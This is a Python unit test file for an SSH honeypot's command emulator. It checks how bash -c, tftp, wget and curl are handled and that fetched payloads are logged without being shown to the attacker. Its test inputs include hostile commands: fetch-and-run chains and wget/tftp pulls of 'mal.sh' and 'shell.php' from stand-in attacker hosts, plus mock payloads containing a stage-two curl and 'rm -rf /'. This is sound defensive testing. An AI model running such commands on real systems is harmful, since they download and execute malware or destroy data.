import unittest
from unittest.mock import MagicMock, patch
import os
import sys
import datetime

# Ensure project root is in path
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "../.."))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

from ssh_honeypot.core.command_handler import CommandHandler


class TestEnhancedCommandHandlers(unittest.TestCase):
    def setUp(self):
        self.db = MagicMock()
        self.llm = MagicMock()
        self.db.honey_db = self.db  # For handlers using self.honey_db
        self.db.get_cached_response.return_value = None
        self.db.update_user_file.return_value = True
        self.db.log_url_request.return_value = True

        # Instantiate CommandHandler
        self.handler = CommandHandler(self.llm, self.db)

    # --- Bash / Sh Enhancements ---

    def test_bash_c_simple(self):
        """Test that bash -c 'command' executes recursively."""
        with patch.object(
            self.handler,
            "process_command",
            return_value=("mock_out", {}, {"source": "test"}),
        ) as mock_proc:
            out, updates, meta = self.handler.handle_bash("bash -c 'ls -la'", {})
            mock_proc.assert_called_once_with("ls -la", {})
            self.assertEqual(out, "mock_out")

    def test_bash_c_chain(self):
        """Test that bash -c handles command chains via process_command."""
        # Note: CommandHandler.process_command handles chaining (&&, ;, etc)
        # We just need to verify it's passed the whole string.
        with patch.object(
            self.handler,
            "process_command",
            return_value=("chain_out", {}, {"source": "test"}),
        ) as mock_proc:
            out, updates, meta = self.handler.handle_bash(
                "bash -c 'wget http://a.com/b -O b; sh b'", {}
            )
            mock_proc.assert_called_once_with("wget http://a.com/b -O b; sh b", {})
            self.assertEqual(out, "chain_out")

    def test_sh_aliasing(self):
        """Test that sh behaves exactly like bash."""
        with patch.object(
            self.handler,
            "process_command",
            return_value=("sh_out", {}, {"source": "test"}),
        ) as mock_proc:
            out, updates, meta = self.handler.handle_sh("sh -c 'whoami'", {})
            mock_proc.assert_called_once_with("whoami", {})
            self.assertEqual(out, "sh_out")

    # --- TFTP Handler ---

    @patch("ssh_honeypot.core.clogging.clogger")
    def test_tftp_busybox_format(self, mock_clogger):
        """Test tftp -g -r remotefile host (Busybox style)."""
        pm = MagicMock()
        pm.download_and_analyze_sync.return_value = b"#!/bin/sh\necho infected"
        self.handler.payload_manager = pm

        ctx = {
            "client_ip": "1.2.3.4",
            "user": "root",
            "cwd": "/tmp",
            "session_id": "sess123",
        }
        out, updates, meta = self.handler.handle_tftp(
            "tftp -g -r script.sh 5.5.5.5", ctx
        )

        self.assertIn("Getting script.sh from 5.5.5.5", out)
        # Verify NO pollution
        self.assertNotIn("[Payload Sample]:", out)
        self.assertNotIn("#!/bin/sh", out)
        self.db.log_url_request.assert_called_once()
        # Verify logging
        mock_clogger.log_event.assert_called()

    @patch("ssh_honeypot.core.clogging.clogger")
    def test_tftp_standard_format(self, mock_clogger):
        """Test tftp host -c get remotefile (Standard style)."""
        pm = MagicMock()
        pm.download_and_analyze_sync.return_value = b"<?php phpinfo(); ?>"
        self.handler.payload_manager = pm

        ctx = {
            "client_ip": "1.2.3.4",
            "user": "root",
            "cwd": "/var/www/html",
            "session_id": "sess123",
        }
        out, updates, meta = self.handler.handle_tftp(
            "tftp 8.8.8.8 -c get shell.php", ctx
        )

        self.assertIn("Getting shell.php from 8.8.8.8", out)
        self.assertNotIn("[Payload Sample]:", out)
        self.assertNotIn("<?php", out)
        mock_clogger.log_event.assert_called()

    def test_tftp_interactive_fallback(self):
        """Test tftp with just a host (simulated interactive mode)."""
        out, updates, meta = self.handler.handle_tftp("tftp 1.1.1.1", {})
        self.assertIn("Connected to 1.1.1.1.", out)
        self.assertIn("tftp> get", out)

    # --- Payload Snippet Display (Real-time Preview) ---

    @patch("ssh_honeypot.core.clogging.clogger")
    def test_wget_script_preview(self, mock_clogger):
        """Test that wget logs snippet but does NOT pollute stdout."""
        pm = MagicMock()
        pm.download_and_analyze_sync.return_value = (
            b"#!/bin/bash\necho 'Stage 1'\ncurl http://evil.com/stage2"
        )
        self.handler.payload_manager = pm

        ctx = {
            "client_ip": "1.1.1.1",
            "user": "root",
            "cwd": "/tmp",
            "session_id": "s1",
        }
        out, updates, meta = self.handler.handle_wget(
            "wget http://attacker.com/mal.sh", ctx
        )

        self.assertNotIn("[Payload Sample]:", out)
        self.assertNotIn("#!/bin/bash", out)
        mock_clogger.log_event.assert_called()

    @patch("ssh_honeypot.core.clogging.clogger")
    def test_curl_json_preview(self, mock_clogger):
        """Test that curl logs snippet but does NOT pollute stdout."""
        pm = MagicMock()
        pm.download_and_analyze_sync.return_value = (
            b'{"status": "infected", "cmd": "rm -rf /"}'
        )
        self.handler.payload_manager = pm

        ctx = {
            "client_ip": "2.2.2.2",
            "user": "root",
            "cwd": "/tmp",
            "session_id": "s2",
        }
        # curl -o data.json ...
        out, updates, meta = self.handler.handle_curl(
            "curl http://api.evil.com/config.json -o data.json", ctx
        )

        self.assertNotIn("[Payload Sample]:", out)
        self.assertNotIn('{"status": "infected"', out)
        mock_clogger.log_event.assert_called()

    @patch("ssh_honeypot.core.clogging.clogger")
    def test_no_snippet_for_binaries(self, mock_clogger):
        """Test that binary files do not show snippets."""
        pm = MagicMock()
        # ELF header
        pm.download_and_analyze_sync.return_value = (
            b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        )
        self.handler.payload_manager = pm

        ctx = {
            "client_ip": "3.3.3.3",
            "user": "root",
            "cwd": "/tmp",
            "session_id": "s3",
        }
        out, updates, meta = self.handler.handle_wget(
            "wget http://attacker.com/rootkit.bin", ctx
        )

        self.assertNotIn("[Payload Sample]:", out)
        self.assertIn("saved", out)

    # --- Realism / Failure Modes ---

    def test_curl_timeout_realism(self):
        """Test that curl to a private IP returns a timeout error in test mode."""
        # Force download failure
        pm = MagicMock()
        pm.download_and_analyze_sync.return_value = None
        self.handler.payload_manager = pm

        with patch.dict(os.environ, {"SSHPOT_TEST_MODE": "1"}):
            out, updates, meta = self.handler.handle_curl(
                "curl 10.0.0.1", {"client_ip": "1.1.1.1"}
            )
            self.assertIn("Connection timed out", out)


if __name__ == "__main__":
    unittest.main()
